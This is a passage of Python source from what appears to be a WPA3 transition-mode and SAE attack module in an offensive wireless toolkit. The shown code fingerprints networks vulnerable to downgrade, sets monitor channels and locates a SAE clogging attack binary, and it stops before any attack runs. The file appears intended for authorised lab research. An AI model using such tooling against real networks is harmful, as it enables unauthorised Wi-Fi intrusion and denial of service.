#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""WPA3 transition / SAE lab attack suite (bridge to wireless-research PoCs).

Bridges techniques from DragonShift, WPA3-Transition-mode-Downgrade-attack,
dragon-drain / WPA3-Attack-Nuseo1, Politician (CSA), and wpa3_sec (timing).

Version: 1.1.0
"""


import logging
import os
import random
import shutil
import subprocess
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

__version__ = "1.1.0"


def _forge_root() -> Path:
    """Resolve WirelessXPL-Forge package root (parent of ``wirelessxpl``)."""
    return Path(__file__).resolve().parents[4]


def _wireless_research_root() -> Path:
    """Path to ``submodules/IoT/wireless-research`` sibling of this Forge checkout."""
    return Path(__file__).resolve().parents[5] / "wireless-research"


def _project_tmp() -> Path:
    """Lab temp dir under the Forge tree (corporate temp-dir policy)."""
    p = _forge_root() / ".tmp"
    p.mkdir(parents=True, exist_ok=True)
    return p


def _parse_rsn_akms_mfp(rsn_info: bytes) -> tuple[list[str], str]:
    """Parse RSN IE for AKM OUI types and MFP string (DragonShift-style).

    Args:
        rsn_info: Raw RSN information element payload (without IE header).

    Returns:
        Tuple of (list of human-readable AKM labels, mfp status string).
    """
    if len(rsn_info) < 10:
        return [], "Inactive"
    auths: list[str] = []
    cipher_suite_count = int.from_bytes(rsn_info[6:8], byteorder="little")
    cipher_offset = 8 + cipher_suite_count * 4
    if len(rsn_info) < cipher_offset + 2:
        return auths, "Inactive"
    akm_suite_count = int.from_bytes(rsn_info[cipher_offset : cipher_offset + 2], byteorder="little")
    akm_offset = cipher_offset + 2
    for i in range(akm_suite_count):
        base = akm_offset + i * 4
        if base + 4 > len(rsn_info):
            break
        akm_suite = rsn_info[base : base + 4]
        kind = akm_suite[3]
        if kind == 1:
            auths.append("802.1X (Enterprise)")
        elif kind == 2:
            auths.append("PSK")
        elif kind == 8:
            auths.append("SAE")
    tail = akm_offset + akm_suite_count * 4
    mfp = "Inactive"
    if tail + 2 <= len(rsn_info):
        rsn_capabilities = int.from_bytes(rsn_info[tail : tail + 2], byteorder="little")
        if rsn_capabilities & 0b01000000:
            mfp = "Optional"
        if rsn_capabilities & 0b10000000:
            mfp = "Required"
    return auths, mfp


def _is_transition_fingerprint(auths: list[str], mfp: str) -> bool:
    """Return True if AKMs suggest WPA3 transition (SAE + PSK) with weak MFP."""
    return "SAE" in auths and "PSK" in auths and mfp == "Inactive"


def _set_monitor_channel(iface: str, channel: int) -> bool:
    """Best-effort: ``iw dev <iface> set channel <n>`` (Linux)."""
    iw = shutil.which("iw")
    if not iw:
        return False
    try:
        r = subprocess.run(
            [iw, "dev", iface, "set", "channel", str(int(channel))],
            capture_output=True,
            text=True,
            timeout=5,
            encoding="utf-8",
            errors="replace",
        )
        return r.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _find_sae_clogging_binary() -> Path | None:
    """Locate compiled ``sae_clogging_attack`` from WPA3-Transition-mode-Downgrade-attack."""
    wr = _wireless_research_root()
    candidates = [
        wr / "WPA3-Transition-mode-Downgrade-attack" / "sae_clogging_attack",
        wr / "WPA3-Transition-mode-Downgrade-attack" / "sae_clogging_attack.exe",
    ]
    for c in candidates:
        if not c.is_file():
            continue
        if os.name == "nt" or os.access(c, os.X_OK):
            return c
    which = shutil.which("sae_clogging_attack")
    if which:
        return Path(which)
    return None


@requires_os(OSRequirement.LINUX_ONLY)
